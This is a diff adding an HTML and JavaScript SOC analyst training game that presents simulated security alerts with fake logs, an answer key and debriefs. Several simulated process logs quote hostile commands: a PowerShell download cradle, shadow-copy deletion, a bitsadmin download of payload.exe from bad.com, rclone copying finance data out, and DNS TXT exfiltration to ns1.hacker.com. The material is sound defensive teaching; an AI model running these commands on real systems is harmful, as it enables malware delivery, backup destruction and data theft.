@@ -1,0 +1,571 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOC Incident Commander</title>
+    <style>
+        :root {
+            --bg-dark: #0f111a;
+            --bg-panel: #1a1d2e;
+            --border-color: #2e3456;
+            --text-main: #b4bcf0;
+            --text-bright: #ffffff;
+            --accent-blue: #3b82f6;
+            --accent-green: #10b981;
+            --accent-red: #ef4444;
+            --accent-warn: #f59e0b;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 20px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            overflow: hidden;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        header h1 { font-size: 20px; color: var(--text-bright); }
+        .score-badge { background-color: var(--accent-blue); color: #fff; padding: 6px 15px; border-radius: 4px; font-weight: bold; font-size: 14px;}
+
+        /* Alert Display Banner */
+        .alert-banner {
+            background-color: rgba(239, 68, 68, 0.1);
+            border-left: 4px solid var(--accent-red);
+            padding: 15px;
+            border-radius: 0 4px 4px 0;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .alert-header-row { display: flex; justify-content: space-between; align-items: center; }
+        .alert-header-row h2 { font-size: 15px; text-transform: uppercase; color: var(--accent-red); letter-spacing: 0.5px;}
+        .round-tracker { font-size: 13px; font-weight: bold; color: var(--text-bright); background: rgba(0,0,0,0.3); padding: 4px 10px; border-radius: 4px;}
+        .alert-details { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; font-size: 13px; color: var(--text-bright); }
+
+        /* Main Workspace Layout */
+        .workspace {
+            display: grid;
+            grid-template-columns: 220px 1fr 320px;
+            flex-grow: 1;
+            gap: 15px;
+            min-height: 0;
+        }
+
+        /* Left Panel - Navigation */
+        .nav-panel {
+            background-color: var(--bg-panel);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .nav-title { font-size: 11px; text-transform: uppercase; color: #6b7280; font-weight: bold; margin-top: 5px; }
+        .nav-btn {
+            background: #252942;
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            padding: 10px;
+            border-radius: 4px;
+            text-align: left;
+            cursor: pointer;
+            font-size: 13px;
+            transition: all 0.2s;
+        }
+        .nav-btn:hover, .nav-btn.active {
+            background-color: var(--accent-blue);
+            color: white;
+            border-color: var(--accent-blue);
+        }
+
+        /* Center Panel - Log Viewer Screen */
+        .viewer-panel {
+            background-color: var(--bg-panel);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            display: flex;
+            flex-direction: column;
+            min-height: 0;
+        }
+        .viewer-header {
+            background-color: rgba(0,0,0,0.2);
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--border-color);
+            font-size: 13px;
+            font-weight: bold;
+            color: var(--text-bright);
+        }
+        .viewer-content {
+            padding: 15px;
+            overflow-y: auto;
+            flex-grow: 1;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 12px;
+            line-height: 1.6;
+            white-space: pre-wrap;
+        }
+
+        /* Right Panel - Disposition and Triage form */
+        .triage-panel {
+            background-color: var(--bg-panel);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        .triage-section h3 { font-size: 13px; color: var(--text-bright); margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px;}
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; font-size: 12px; color: #9ca3af; margin-bottom: 5px; }
+        .form-group select, .form-group textarea {
+            width: 100%;
+            background-color: #121422;
+            border: 1px solid var(--border-color);
+            color: var(--text-bright);
+            padding: 8px;
+            border-radius: 4px;
+            font-size: 13px;
+            outline: none;
+        }
+        .form-group textarea { resize: none; height: 70px; }
+
+        .submit-btn {
+            background-color: var(--accent-green);
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 14px;
+            width: 100%;
+            transition: opacity 0.2s;
+        }
+        .submit-btn:hover { opacity: 0.9; }
+
+        /* Summary Screen */
+        .summary-panel {
+            display: none; /* Hidden until end of game */
+            flex-direction: column;
+            background-color: var(--bg-panel);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 30px;
+            overflow-y: auto;
+            height: 100%;
+        }
+        .summary-header { text-align: center; margin-bottom: 30px; }
+        .summary-header h2 { font-size: 28px; color: var(--text-bright); margin-bottom: 10px; }
+        .summary-header p { font-size: 16px; color: var(--text-main); }
+        
+        .result-card {
+            background-color: #121422;
+            border-left: 5px solid;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 4px;
+        }
+        .result-card.success { border-color: var(--accent-green); }
+        .result-card.fail { border-color: var(--accent-red); }
+        .result-title { font-size: 15px; color: var(--text-bright); font-weight: bold; margin-bottom: 8px;}
+        .result-verdict { font-size: 13px; margin-bottom: 8px; }
+        .result-debrief { font-size: 13px; color: #a1a1aa; line-height: 1.5; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 4px;}
+        
+        .restart-btn {
+            background-color: var(--accent-blue);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 14px;
+            margin-top: 20px;
+            align-self: center;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Security Operations Center // Incident Dashboard</h1>
+    <div class="score-badge" id="scoreDisplay">Score: 0 / 5</div>
+</header>
+
+<div id="gameUI" style="display: flex; flex-direction: column; gap: 15px; flex-grow: 1; min-height:0;">
+    <div class="alert-banner">
+        <div class="alert-header-row">
+            <h2 id="alertTitle">Loading Case File...</h2>
+            <div class="round-tracker" id="roundTracker">ROUND 1 / 5</div>
+        </div>
+        <div class="alert-details">
+            <div><strong>Target Host:</strong> <span id="alertHost">-</span></div>
+            <div><strong>User Account:</strong> <span id="alertUser">-</span></div>
+            <div><strong>Artifact/Trigger:</strong> <span id="alertArtifact">-</span></div>
+            <div><strong>Source IP:</strong> <span id="alertIP">-</span></div>
+        </div>
+    </div>
+
+    <div class="workspace">
+        <div class="nav-panel">
+            <span class="nav-title">Investigation Logs</span>
+            <button class="nav-btn active" id="btn-email" onclick="switchTab('email')">✉️ Corporate Email Logs</button>
+            <button class="nav-btn" id="btn-auth" onclick="switchTab('auth')">🔑 Authentication Logs</button>
+            <button class="nav-btn" id="btn-process" onclick="switchTab('process')">💻 Endpoint Process History</button>
+            <span class="nav-title">Threat Intelligence</span>
+            <button class="nav-btn" id="btn-intel" onclick="switchTab('intel')">🌐 Global IP Reputation</button>
+        </div>
+
+        <div class="viewer-panel">
+            <div class="viewer-header" id="viewerTitle">Corporate Email Logs</div>
+            <div class="viewer-content" id="viewerContent">Loading log database...</div>
+        </div>
+
+        <div class="triage-panel">
+            <div class="triage-section">
+                <h3>Case Disposition</h3>
+                <div style="height: 10px;"></div>
+                
+                <div class="form-group">
+                    <label for="verdictSelect">Analysis Verdict</label>
+                    <select id="verdictSelect">
+                        <option value="">-- Choose Classification --</option>
+                        <option value="FP">False Positive (Legitimate Behavior)</option>
+                        <option value="TP">True Positive (Malicious/Compromised)</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="actionSelect">Remediation Action</label>
+                    <select id="actionSelect">
+                        <option value="">-- Select Action --</option>
+                        <option value="none">None (Dismiss Alert)</option>
+                        <option value="isolate">Isolate Endpoint & Reset Credentials</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="notesArea">Investigative Notes</label>
+                    <textarea id="notesArea" placeholder="Draft your incident report here..."></textarea>
+                </div>
+            </div>
+            <button class="submit-btn" onclick="submitCase()">Submit Resolution</button>
+        </div>
+    </div>
+</div>
+
+<div class="summary-panel" id="summaryPanel">
+    <div class="summary-header">
+        <h2>Shift Completed: After-Action Report</h2>
+        <p id="finalScoreText">You resolved X out of 5 cases correctly.</p>
+    </div>
+    <div id="resultsContainer">
+        </div>
+    <button class="restart-btn" onclick="initGame()">Start Next Shift (Play Again)</button>
+</div>
+
+<script>
+    // --- MASTER DATABASE OF SCENARIOS (Easily Expandable) ---
+    const allCasesMaster = [
+        {
+            title: "EDR ALERT: Suspicious Microsoft Word Child Process",
+            host: "DESKTOP-MKTG-04", user: "m_watkins", artifact: "invoice_aug.doc", ip: "194.26.135.11",
+            correctVerdict: "TP", correctAction: "isolate",
+            debrief: "TP/Isolate: The user received an external email with an attachment. Shortly after, winword.exe spawned PowerShell with a hidden, encoded bypass command. This is classic macro-based malware (likely Emotet) attempting to download a payload.",
+            logs: {
+                email: `TIMESTAMP           SENDER                   RECIPIENT       SUBJECT                    ATTACHMENT\n08:01:12 internally@company.com  m_watkins@corp  Weekly Sync Invite         None\n08:12:11 billing@ups-delivery.net m_watkins@corp  Overdue Shipment Invoices  invoice_aug.doc\n08:44:00 hr@corp.com             m_watkins@corp  Please review benefits     None`,
+                auth: `TIMESTAMP           SOURCE_IP        USER            STATUS    LOCATION\n07:55:10 172.16.45.112    m_watkins       SUCCESS   Internal HQ\n08:00:15 172.16.45.112    m_watkins       SUCCESS   Internal HQ\n08:14:22 194.26.135.11    m_watkins       SUCCESS   Unknown / Remote`,
+                process: `TIMESTAMP           PARENT_PROCESS        CHILD_PROCESS           ARGUMENTS\n08:02:00 svchost.exe           RuntimeBroker.exe       -\n08:03:00 explorer.exe          outlook.exe             -\n08:13:01 outlook.exe           winword.exe             invoice_aug.doc\n08:13:04 winword.exe           powershell.exe          -ExecutionPolicy Bypass -windowstyle hidden -enc IEX(New-Object Net.WebClient)\n08:14:00 svchost.exe           SearchUI.exe            -`,
+                intel: `IP ADDRESS      REPUTATION      OWNER               MALICIOUS MATCHES\n194.26.135.11   MALICIOUS       Unknown ISP         Match discovered in active Emotet C2 arrays.`
+            }
+        },
+        {
+            title: "FIREWALL ALERT: Inbound Port 443 Sweep Trigger",
+            host: "PROD-WEB-PROXY", user: "SYSTEM", artifact: "TCP Port 443 Spike", ip: "8.8.8.8",
+            correctVerdict: "FP", correctAction: "none",
+            debrief: "FP/Dismiss: This alert fired on the proxy server receiving traffic from 8.8.8.8. Threat intel confirms 8.8.8.8 is a clean Google DNS server. The processes running are just standard Nginx daemons. No malicious activity occurred.",
+            logs: {
+                email: `TIMESTAMP           SENDER                   RECIPIENT       SUBJECT                    ATTACHMENT\nNo email records generated for server infrastructure.`,
+                auth: `TIMESTAMP           SOURCE_IP        USER            STATUS    LOCATION\n09:15:00 10.0.5.55        admin           SUCCESS   Internal IT VLAN\n10:11:00 8.8.8.8          SYSTEM          DENIED    Global Public Node\n10:11:05 10.0.5.55        admin           SUCCESS   Internal IT VLAN`,
+                process: `TIMESTAMP           PARENT_PROCESS        CHILD_PROCESS           ARGUMENTS\n10:10:00 systemd               systemd-journal         -\n10:11:00 systemd               nginx                   -g daemon on;\n10:11:02 nginx                 stub_status             -\n10:15:00 cron                  bash                    /opt/scripts/backup.sh`,
+                intel: `IP ADDRESS      REPUTATION      OWNER               MALICIOUS MATCHES\n8.8.8.8         CLEAN           Google LLC          Verified clean public DNS provider.`
+            }
+        },
+        {
+            title: "SIEM ALERT: Multiple Failed Logins Followed by Success",
+            host: "DESKTOP-HR-01", user: "j_doe", artifact: "NTLM Brute Force", ip: "45.227.254.5",
+            correctVerdict: "TP", correctAction: "isolate",
+            debrief: "TP/Isolate: A known malicious botnet IP spammed failed login attempts against j_doe, finally succeeding. Once logged in, the attacker immediately ran 'whoami /groups' to check privileges. The account is compromised.",
+            logs: {
+                email: `TIMESTAMP           SENDER                   RECIPIENT       SUBJECT                    ATTACHMENT\n01:05:00 noreply@vendor.com      j_doe@corp      Receipt for services       receipt.pdf\n01:10:00 IT-Service@corp.com     j_doe@corp      Mandatory Password Change  None`,
+                auth: `TIMESTAMP           SOURCE_IP        USER            STATUS    LOCATION\n01:15:22 45.227.254.5     j_doe           FAILED    Seychelles\n01:15:40 45.227.254.5     j_doe           FAILED    Seychelles\n01:15:55 45.227.254.5     j_doe           FAILED    Seychelles\n01:16:01 45.227.254.5     j_doe           SUCCESS   Seychelles`,
+                process: `TIMESTAMP           PARENT_PROCESS        CHILD_PROCESS           ARGUMENTS\n01:15:00 services.exe          svchost.exe             -k LocalService\n01:16:05 userinit.exe          explorer.exe            -\n01:17:11 explorer.exe          cmd.exe                 whoami /groups\n01:17:15 cmd.exe               net.exe                 user /domain`,
+                intel: `IP ADDRESS      REPUTATION      OWNER               MALICIOUS MATCHES\n45.227.254.5    MALICIOUS       Clandestine Net     Flagged as active SSH/RDP scanning botnet relay.`
+            }
+        },
+        {
+            title: "EDR ALERT: Untrusted Command Shell Executing Admin Sweeps",
+            host: "DESKTOP-DEV-09", user: "a_smith", artifact: "ipconfig /all", ip: "172.16.45.33",
+            correctVerdict: "FP", correctAction: "none",
+            debrief: "FP/Dismiss: This is a developer (a_smith) operating from an internal IP. The email logs show IT asked him to audit internal IP scopes. Running ipconfig and netstat is legitimate behavior given his business justification.",
+            logs: {
+                email: `TIMESTAMP           SENDER                   RECIPIENT       SUBJECT                    ATTACHMENT\n10:45:00 jira@corp.com           a_smith@corp    Ticket #442 Assigned       None\n11:00:00 it_manager@corp.com     a_smith@corp    Please audit internal IPs  None\n11:05:00 github@corp.com         a_smith@corp    PR Approved                None`,
+                auth: `TIMESTAMP           SOURCE_IP        USER            STATUS    LOCATION\n08:50:00 172.16.45.33     a_smith         SUCCESS   Internal HQ Dev Space\n09:30:00 172.16.45.33     a_smith         SUCCESS   Internal HQ Dev Space`,
+                process: `TIMESTAMP           PARENT_PROCESS        CHILD_PROCESS           ARGUMENTS\n11:10:00 explorer.exe          code.exe                - \n11:15:00 explorer.exe          powershell.exe          -\n11:15:10 powershell.exe        ipconfig.exe            /all\n11:15:15 powershell.exe        netstat.exe             -an\n11:20:00 svchost.exe           taskhostw.exe           -`,
+                intel: `IP ADDRESS      REPUTATION      OWNER               MALICIOUS MATCHES\n172.16.45.33    CLEAN           Internal DHCP Pool  Legitimate workstation asset assigned to engineering.`
+            }
+        },
+        {
+            title: "SIEM ALERT: Impossible Travel (VPN)",
+            host: "CORP-VPN-GW", user: "s_miller", artifact: "Rapid Geo-Velocity", ip: "185.15.22.1",
+            correctVerdict: "TP", correctAction: "isolate",
+            debrief: "TP/Isolate: The user received a phishing email mimicking Okta/SSO. Shortly after, a successful VPN login originated from a malicious VPN node in Russia, despite the user logging in from the US 10 minutes prior. Credentials were harvested.",
+            logs: {
+                email: `TIMESTAMP           SENDER                   RECIPIENT       SUBJECT                    ATTACHMENT\n14:00:00 marketing@corp.com      s_miller@corp   Draft Review               None\n14:15:00 security-okta@secure.co s_miller@corp   Verify Your Account Login  link.html\n14:30:00 calendar@corp.com       s_miller@corp   Upcoming: 1:1 Sync         None`,
+                auth: `TIMESTAMP           SOURCE_IP        USER            STATUS    LOCATION\n14:10:00 73.22.11.4       s_miller        SUCCESS   United States (Home)\n14:22:00 185.15.22.1      s_miller        SUCCESS   Russian Federation\n14:25:00 185.15.22.1      s_miller        SUCCESS   Russian Federation`,
+                process: `TIMESTAMP           PARENT_PROCESS        CHILD_PROCESS           ARGUMENTS\nNo endpoint process logs available for VPN Gateway appliances.`,
+                intel: `IP ADDRESS      REPUTATION      OWNER               MALICIOUS MATCHES\n185.15.22.1     MALICIOUS       Bulletproof Hosting Known exit node for initial access brokers.`
+            }
+        },
+        {
+            title: "EDR ALERT: Mass File Deletion via System Binary",
+            host: "SRV-FILE-01", user: "SYSTEM", artifact: "vssadmin.exe", ip: "10.10.1.5",
+            correctVerdict: "TP", correctAction: "isolate",
+            debrief: "TP/Isolate: The server ran 'vssadmin delete shadows /all /quiet'. This is the quintessential hallmark of Ransomware destroying backups before encrypting files. Immediate isolation is required to save the remaining network.",
+            logs: {
+                email: `No email records generated for server infrastructure.`,
+                auth: `TIMESTAMP           SOURCE_IP        USER            STATUS    LOCATION\n02:00:00 10.10.1.5        admin_service   SUCCESS   Internal DC\n02:30:00 10.10.1.5        admin_service   SUCCESS   Internal DC`,
+                process: `TIMESTAMP           PARENT_PROCESS        CHILD_PROCESS           ARGUMENTS\n02:15:00 svchost.exe           WmiPrvSE.exe            -\n02:31:00 wscript.exe           cmd.exe                 /c vssadmin.exe delete shadows /all /quiet\n02:31:05 cmd.exe               vssadmin.exe            delete shadows /all /quiet\n02:32:00 cmd.exe               cipher.exe              /w:C:\\`,
+                intel: `IP ADDRESS      REPUTATION      OWNER               MALICIOUS MATCHES\n10.10.1.5       CLEAN           Internal Server     Domain Controller / Admin subnet.`
+            }
+        },
+        {
+            title: "IDS ALERT: Internal Vulnerability Scanner Activity",
+            host: "DESKTOP-SALES-12", user: "N/A", artifact: "Mass Port Probing", ip: "10.0.100.45",
+            correctVerdict: "FP", correctAction: "none",
+            debrief: "FP/Dismiss: A massive port scan hit a sales desktop, but threat intel and process logs reveal the source IP belongs to the internal Qualys vulnerability scanner authorized by IT. Standard background noise.",
+            logs: {
+                email: `TIMESTAMP           SENDER                   RECIPIENT       SUBJECT                    ATTACHMENT\n12:00:00 hr@corp.com             sales_team@corp Policy Update              None\n12:10:00 it_alerts@corp.com      all_staff@corp  Weekly network scan notice None`,
+                auth: `TIMESTAMP           SOURCE_IP        USER            STATUS    LOCATION\n11:00:00 10.0.5.20        t_sales         SUCCESS   Internal WiFi\n12:20:00 10.0.100.45      qualys_svc      SUCCESS   Internal Qualys Server`,
+                process: `TIMESTAMP           PARENT_PROCESS        CHILD_PROCESS           ARGUMENTS\n12:15:00 explorer.exe          chrome.exe              -\n12:20:00 svchost.exe           WmiPrvSE.exe            - \n12:25:00 chrome.exe            teams.exe               -`,
+                intel: `IP ADDRESS      REPUTATION      OWNER               MALICIOUS MATCHES\n10.0.100.45     CLEAN           Internal App        Authorized Qualys Vulnerability Scanner node.`
+            }
+        },
+        {
+            title: "DLP ALERT: High Volume Data Exfiltration (Rclone)",
+            host: "DESKTOP-FIN-02", user: "p_accnt", artifact: "rclone.exe", ip: "45.33.22.1",
+            correctVerdict: "TP", correctAction: "isolate",
+            debrief: "TP/Isolate: A finance user received a spear-phishing email. Shortly after, a portable tool 'rclone.exe' was used via command line to secretly copy entire financial directories to an external Mega cloud storage IP. This is active data theft.",
+            logs: {
+                email: `TIMESTAMP           SENDER                   RECIPIENT       SUBJECT                    ATTACHMENT\n09:00:00 ceo_update@corp.com     p_accnt@corp    Quarterly Update           None\n09:15:00 partner@baddomain.co    p_accnt@corp    URGENT: Audit Documents    audit_tool.zip\n09:30:00 payroll@corp.com        p_accnt@corp    Timesheets                 None`,
+                auth: `TIMESTAMP           SOURCE_IP        USER            STATUS    LOCATION\n08:50:00 10.0.8.22        p_accnt         SUCCESS   Internal Finance\n09:20:00 10.0.8.22        p_accnt         SUCCESS   Internal Finance`,
+                process: `TIMESTAMP           PARENT_PROCESS        CHILD_PROCESS           ARGUMENTS\n09:16:00 explorer.exe          7zFM.exe                audit_tool.zip\n09:25:00 explorer.exe          cmd.exe                 - \n09:25:30 cmd.exe               rclone.exe              copy C:\\Finance_Data Mega:/Drops/ \n09:26:00 svchost.exe           taskhostw.exe           -`,
+                intel: `IP ADDRESS      REPUTATION      OWNER               MALICIOUS MATCHES\n45.33.22.1      SUSPICIOUS      Mega Cloud Storage  IP associated with anonymous file hosting drops.`
+            }
+        },
+        {
+            title: "EDR ALERT: Developer Downloading Script from GitHub",
+            host: "DESKTOP-ENG-55", user: "b_coder", artifact: "Invoke-WebRequest", ip: "140.82.112.4",
+            correctVerdict: "FP", correctAction: "none",
+            debrief: "FP/Dismiss: The alert fired because PowerShell downloaded a payload from the internet. However, looking at the logs, it's an engineer downloading 'node_setup.ps1' from legitimate GitHub IPs. This is standard developer behavior.",
+            logs: {
+                email: `TIMESTAMP           SENDER                   RECIPIENT       SUBJECT                    ATTACHMENT\n13:00:00 jira@corp.com           b_coder@corp    New Environment Setup      None\n13:10:00 team@corp.com           b_coder@corp    Lunch?                     None`,
+                auth: `TIMESTAMP           SOURCE_IP        USER            STATUS    LOCATION\n12:50:00 10.0.9.15        b_coder         SUCCESS   Internal Engineering\n13:15:00 10.0.9.15        b_coder         SUCCESS   Internal Engineering`,
+                process: `TIMESTAMP           PARENT_PROCESS        CHILD_PROCESS           ARGUMENTS\n13:05:00 explorer.exe          WindowsTerminal.exe     -\n13:12:00 WindowsTerminal.exe   powershell.exe          -\n13:12:15 powershell.exe        powershell.exe          Invoke-WebRequest -Uri https://github.com/.../node_setup.ps1\n13:15:00 svchost.exe           SearchApp.exe           -`,
+                intel: `IP ADDRESS      REPUTATION      OWNER               MALICIOUS MATCHES\n140.82.112.4    CLEAN           GitHub, Inc.        Legitimate code repository hosting infrastructure.`
+            }
+        },
+        {
+            title: "SIEM ALERT: Abnormal Access to HR Database from Hotel IP",
+            host: "SRV-DB-HR", user: "c_officer", artifact: "Remote DB Access", ip: "209.18.47.2",
+            correctVerdict: "FP", correctAction: "none",
+            debrief: "FP/Dismiss: A high-level executive (c_officer) accessed a sensitive DB from an external IP. However, email logs show they had an approved travel itinerary, and the Threat Intel confirms the IP belongs to a Marriott Hotel.",
+            logs: {
+                email: `TIMESTAMP           SENDER                   RECIPIENT       SUBJECT                    ATTACHMENT\n07:00:00 expedia@travel.com      c_officer@corp  Itinerary: Chicago Trip    None\n18:00:00 hr_team@corp.com        c_officer@corp    Please review Q3 salaries  None\n18:30:00 alerts@corp.com         c_officer@corp    Login from new device      None`,
+                auth: `TIMESTAMP           SOURCE_IP        USER            STATUS    LOCATION\n18:35:00 209.18.47.2      c_officer       SUCCESS   Chicago, IL\n18:40:00 209.18.47.2      c_officer       SUCCESS   Chicago, IL`,
+                process: `TIMESTAMP           PARENT_PROCESS        CHILD_PROCESS           ARGUMENTS\nNo endpoint process logs for DB servers, only SQL audit logs available.`,
+                intel: `IP ADDRESS      REPUTATION      OWNER               MALICIOUS MATCHES\n209.18.47.2     CLEAN           Marriott Int.       Registered commercial hotel Wi-Fi gateway.`
+            }
+        },
+        {
+            title: "EDR ALERT: BITSAdmin Abuse (Living off the Land)",
+            host: "DESKTOP-OPS-03", user: "r_taylor", artifact: "bitsadmin.exe", ip: "172.16.4.4",
+            correctVerdict: "TP", correctAction: "isolate",
+            debrief: "TP/Isolate: After an abnormal login, 'bitsadmin.exe' (a native Windows tool) was used to download a suspicious executable (payload.exe) to the temp folder. This is a classic 'Living off the Land' attack technique to evade basic antivirus.",
+            logs: {
+                email: `TIMESTAMP           SENDER                   RECIPIENT       SUBJECT                    ATTACHMENT\n10:00:00 alerts@sec.com          soc@corp.com    Daily digest               None\n10:20:00 r_taylor@corp.com       admin@corp.com  I lost my 2FA token        None`,
+                auth: `TIMESTAMP           SOURCE_IP        USER            STATUS    LOCATION\n10:30:00 10.0.1.55        r_taylor        FAILED    Internal Ops\n10:45:00 95.14.2.1        r_taylor        SUCCESS   Unknown / Remote`,
+                process: `TIMESTAMP           PARENT_PROCESS        CHILD_PROCESS           ARGUMENTS\n10:45:00 svchost.exe           wmiprvse.exe            -\n10:46:00 wmiprvse.exe          cmd.exe                 -\n10:46:30 cmd.exe               bitsadmin.exe           /transfer job /download /priority high http://bad.com/payload.exe C:\\temp\\p.exe\n10:47:00 cmd.exe               p.exe                   -`,
+                intel: `IP ADDRESS      REPUTATION      OWNER               MALICIOUS MATCHES\n95.14.2.1       MALICIOUS       Unknown ISP         Flagged for hosting malware drop servers.`
+            }
+        },
+        {
+            title: "FIREWALL ALERT: High Volume Outbound DNS Traffic",
+            host: "DESKTOP-ADMIN-01", user: "SYSTEM", artifact: "DNS Tunneling", ip: "10.0.5.10",
+            correctVerdict: "TP", correctAction: "isolate",
+            debrief: "TP/Isolate: The admin machine is sending massive amounts of TXT DNS queries to an untrusted domain (ns1.hacker.com). Combined with PowerShell base64 execution, this indicates data exfiltration or Command & Control via DNS Tunneling.",
+            logs: {
+                email: `TIMESTAMP           SENDER                   RECIPIENT       SUBJECT                    ATTACHMENT\n08:00:00 sysadmin@corp.com       team@corp.com   Server Patching tonight    None\n08:30:00 vendor@support.com      sysadmin@corp   Tool License Key           license.txt`,
+                auth: `TIMESTAMP           SOURCE_IP        USER            STATUS    LOCATION\n08:15:00 10.0.5.10        admin_svc       SUCCESS   Internal Admin VLAN\n09:00:00 10.0.5.10        admin_svc       SUCCESS   Internal Admin VLAN`,
+                process: `TIMESTAMP           PARENT_PROCESS        CHILD_PROCESS           ARGUMENTS\n08:45:00 explorer.exe          notepad.exe             license.txt\n09:05:00 svchost.exe           powershell.exe          -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA... \n09:05:10 powershell.exe        nslookup.exe            -type=TXT data.ns1.hacker.com`,
+                intel: `IP ADDRESS      REPUTATION      OWNER               MALICIOUS MATCHES\n10.0.5.10       CLEAN           Internal Admin      Local IT machine.`
+            }
+        }
+    ];
+
+    // --- GAME ENGINE LOGIC ---
+    let gameCases = [];
+    let currentCaseIndex = 0;
+    let score = 0;
+    let userResults = []; 
+
+    // Utility: Shuffle Array (Fisher-Yates)
+    function shuffleArray(array) {
+        let curId = array.length;
+        while (0 !== curId) {
+            let randId = Math.floor(Math.random() * curId);
+            curId -= 1;
+            let tmp = array[curId];
+            array[curId] = array[randId];
+            array[randId] = tmp;
+        }
+        return array;
+    }
+
+    function initGame() {
+        // Reset state
+        currentCaseIndex = 0;
+        score = 0;
+        userResults = [];
+        document.getElementById('scoreDisplay').innerText = `Score: 0 / 5`;
+        
+        // Shuffle master list and pick exactly 5
+        const shuffled = shuffleArray([...allCasesMaster]);
+        gameCases = shuffled.slice(0, 5);
+        
+        // UI Reset
+        document.getElementById('gameUI').style.display = 'flex';
+        document.getElementById('summaryPanel').style.display = 'none';
+        
+        loadCase(0);
+    }
+
+    function loadCase(index) {
+        if (index >= 5) {
+            showSummary();
+            return;
+        }
+
+        document.getElementById('roundTracker').innerText = `ROUND ${index + 1} / 5`;
+        
+        const data = gameCases[index];
+        document.getElementById('alertTitle').innerText = data.title;
+        document.getElementById('alertHost').innerText = data.host;
+        document.getElementById('alertUser').innerText = data.user;
+        document.getElementById('alertArtifact').innerText = data.artifact;
+        document.getElementById('alertIP').innerText = data.ip;
+
+        // Reset form inputs
+        document.getElementById('verdictSelect').value = "";
+        document.getElementById('actionSelect').value = "";
+        document.getElementById('notesArea').value = "";
+
+        switchTab('email');
+    }
+
+    function switchTab(tabName) {
+        // Update active buttons
+        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+        document.getElementById(`btn-${tabName}`).classList.add('active');
+        
+        const titles = { 
+            email: "Corporate Email Logs", 
+            auth: "Authentication Logs", 
+            process: "Endpoint Process History", 
+            intel: "Global IP Reputation" 
+        };
+        document.getElementById('viewerTitle').innerText = titles[tabName];
+        document.getElementById('viewerContent').textContent = gameCases[currentCaseIndex].logs[tabName];
+    }
+
+    function submitCase() {
+        const userVerdict = document.getElementById('verdictSelect').value;
+        const userAction = document.getElementById('actionSelect').value;
+        const notes = document.getElementById('notesArea').value.trim();
+
+        if (!userVerdict || !userAction || !notes) {
+            alert("Error: Complete the incident analysis paperwork (Verdict, Remediation, and Notes) before submitting.");
+            return;
+        }
+
+        const currentCase = gameCases[currentCaseIndex];
+        const isCorrect = (userVerdict === currentCase.correctVerdict && userAction === currentCase.correctAction);
+        
+        if (isCorrect) score++;
+        document.getElementById('scoreDisplay').innerText = `Score: ${score} / 5`;
+
+        // Save result for summary screen
+        userResults.push({
+            title: currentCase.title,
+            isCorrect: isCorrect,
+            userVerdict: userVerdict,
+            correctVerdict: currentCase.correctVerdict,
+            debrief: currentCase.debrief
+        });
+
+        currentCaseIndex++;
+        loadCase(currentCaseIndex);
+    }
+
+    function showSummary() {
+        document.getElementById('gameUI').style.display = 'none';
+        const summaryPanel = document.getElementById('summaryPanel');
+        summaryPanel.style.display = 'flex';
+        
+        document.getElementById('finalScoreText').innerText = `You successfully resolved ${score} out of 5 security incidents.`;
+        
+        const container = document.getElementById('resultsContainer');
+        container.innerHTML = ""; // Clear old results
+
+        userResults.forEach((result, idx) => {
+            const statusClass = result.isCorrect ? "success" : "fail";
+            const statusText = result.isCorrect ? "✅ SUCCESS" : "❌ INCORRECT";
+            const userVText = result.userVerdict === "TP" ? "True Positive" : "False Positive";
+            const correctVText = result.correctVerdict === "TP" ? "True Positive" : "False Positive";
+
+            container.innerHTML += `
+                <div class="result-card ${statusClass}">
+                    <div class="result-title">Case ${idx + 1}: ${result.title}</div>
+                    <div class="result-verdict">
+                        <strong>Status:</strong> ${statusText} | 
+                        <strong>Your Call:</strong> ${userVText} | 
+                        <strong>Correct Call:</strong> ${correctVText}
+                    </div>
+                    <div class="result-debrief">
+                        <strong>Analyst Debrief:</strong> ${result.debrief}
+                    </div>
+                </div>
+            `;
+        });
+    }
+
+    // Start game on load
+    window.onload = initGame;
+</script>
+</body>
+</html>
